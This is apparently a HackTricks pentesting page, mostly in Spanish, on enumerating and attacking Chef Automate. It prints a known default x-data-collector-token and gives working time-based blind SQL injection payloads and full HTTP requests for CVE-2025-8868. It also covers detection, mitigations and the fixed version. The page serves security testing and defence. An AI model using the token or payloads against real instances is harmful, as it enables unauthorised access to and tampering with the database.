# Chef Automate Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

## Overview

Esta página recopila técnicas prácticas para enumerar y atacar instancias de Chef Automate, con énfasis en:
- Discovering gRPC-Gateway-backed REST endpoints and inferring request schemas via validation/error responses
- Abusing the x-data-collector-token authentication header when defaults are present
- Time-based blind SQL injection in the Compliance API (CVE-2025-8868) affecting the filters[].type field in /api/v0/compliance/profiles/search

> Nota: Las respuestas del backend que incluyen el header grpc-metadata-content-type: application/grpc típicamente indican un puente gRPC-Gateway que conecta llamadas REST con servicios gRPC.

## Recon: Arquitectura y huellas

- Front-end: A menudo Angular. Los bundles estáticos pueden dar pistas sobre rutas REST (p. ej., /api/v0/...)
- API transport: REST a gRPC vía gRPC-Gateway
- Responses may include grpc-metadata-content-type: application/grpc
- Database/driver fingerprints:
- Cuerpos de error que empiezan con pq: sugieren fuertemente PostgreSQL con el driver Go pq
- Endpoints de Compliance interesantes (auth required):
- POST /api/v0/compliance/profiles/search
- POST /api/v0/compliance/scanner/jobs/search

## Auth: Data Collector Token (x-data-collector-token)

Chef Automate expone un data collector que autentica peticiones mediante un header dedicado:

- Header: x-data-collector-token
- Riesgo: Algunos entornos pueden conservar un token por defecto que concede acceso a rutas API protegidas. Default conocido observado en el wild:
- 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

Si está presente, este token puede usarse para llamar endpoints de la Compliance API que de otro modo requieren auth. Siempre intentar rotar/desactivar defaults durante el hardening.

## API Schema Inference via Error-Driven Discovery

Los endpoints respaldados por gRPC-Gateway a menudo leak errores de validación útiles que describen el modelo de request esperado.

Para /api/v0/compliance/profiles/search, el backend espera un body con un array filters, donde cada elemento es un objeto con:

- type: string (identificador del campo del filtro)
- values: array de strings

Example request shape:
```json
{
"filters": [
{ "type": "name", "values": ["test"] }
]
}
```
JSON malformado o tipos de campo incorrectos típicamente disparan 4xx/5xx con pistas, y las cabeceras indican el comportamiento del gRPC-Gateway. Úsalos para mapear campos y localizar injection surfaces.

## API de Compliance - SQL Injection (CVE-2025-8868)

- Endpoint afectado: POST /api/v0/compliance/profiles/search
- Injection point: filters[].type
- Clase de vulnerabilidad: time-based blind SQL injection in PostgreSQL
- Causa raíz: Falta de proper parameterization/whitelisting al interpolar el campo type en un fragmento SQL dinámico (probablemente usado para construir identifiers/WHERE clauses). Los crafted values en type son evaluados por PostgreSQL.

Working time-based payload:
```json
{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Notas de la técnica:
- Cierra la cadena original con una comilla simple
- Concatena una subconsulta que llama a pg_sleep(N)
- Vuelve a entrar en el contexto de cadena mediante || para que el SQL final siga siendo sintácticamente válido independientemente de dónde se inserte type

### Prueba mediante latencia diferencial

Envía solicitudes emparejadas y compara los tiempos de respuesta para validar la ejecución del lado del servidor:

- N = 1 segundo
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(1))||'","values":["test"]}]}
```
- N = 5 segundos
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Observed behavior:
- Response times scale with pg_sleep(N)
- HTTP 500 responses may include pq: details during probing, confirming SQL execution paths

> Consejo: Use un validador de tiempos (p. ej., múltiples intentos con comparación estadística) para reducir ruido y falsos positivos.

### Impacto

Usuarios autenticados —o actores no autenticados que abusen de un x-data-collector-token por defecto— pueden ejecutar SQL arbitrario dentro del contexto PostgreSQL de Chef Automate, poniendo en riesgo la confidencialidad e integridad de los perfiles de compliance, la configuración y la telemetría.

### Versiones afectadas / Solución

- CVE: CVE-2025-8868
- Guía de actualización: Chef Automate 4.13.295 o posterior (Linux x86) según los avisos del proveedor

## Detección y Forense

- Capa API:
- Monitorizar respuestas 500 en /api/v0/compliance/profiles/search donde filters[].type contiene comillas ('), concatenación (||), o referencias a funciones como pg_sleep
- Inspeccionar cabeceras de respuesta en busca de grpc-metadata-content-type para identificar flujos gRPC-Gateway
- Capa de base de datos (PostgreSQL):
- Auditar llamadas a pg_sleep y errores de identificador malformado (a menudo aparecen con prefijos pq: provenientes del driver pq de Go)
- Autenticación:
- Registrar y alertar sobre el uso de x-data-collector-token, especialmente valores por defecto conocidos, en las rutas API

## Mitigaciones y Endurecimiento

- Inmediatas:
- Rotar/deshabilitar tokens de data collector por defecto
- Restringir el ingreso a los endpoints de data collector; aplicar tokens fuertes y únicos
- A nivel de código:
- Parametrizar consultas; nunca concatenar fragmentos SQL como cadenas
- Restringir estrictamente con lista blanca los valores permitidos de type en el servidor (enum)
- Evitar ensamblar SQL dinámico para identificadores/cláusulas; si se requiere comportamiento dinámico, usar comillas seguras para identificadores y listas blancas explícitas

## Lista de verificación práctica para pruebas

- Comprobar si x-data-collector-token es aceptado y si el valor por defecto conocido funciona
- Mapear el esquema de solicitud de la Compliance API induciendo errores de validación y leyendo mensajes de error/cabeceras
- Probar SQLi en campos menos obvios "tipo-identificador" (p. ej., filters[].type), no solo en arrays de valores o campos de texto de primer nivel
- Usar técnicas basadas en tiempo con concatenación para mantener SQL sintácticamente válido en distintos contextos

## Referencias

- [Cooking an SQL Injection Vulnerability in Chef Automate (XBOW blog)](https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate)
- [Timing trace (XBOW)](https://xbow-website.pages.dev/traces/chef-automate-sql-injection/)
- [CVE-2025-8868](https://www.cve.org/CVERecord?id=CVE-2025-8868)
- [gRPC-Gateway](https://github.com/grpc-ecosystem/grpc-gateway)
- [pq PostgreSQL driver for Go](https://github.com/lib/pq)

{{#include ../../banners/hacktricks-training.md}}
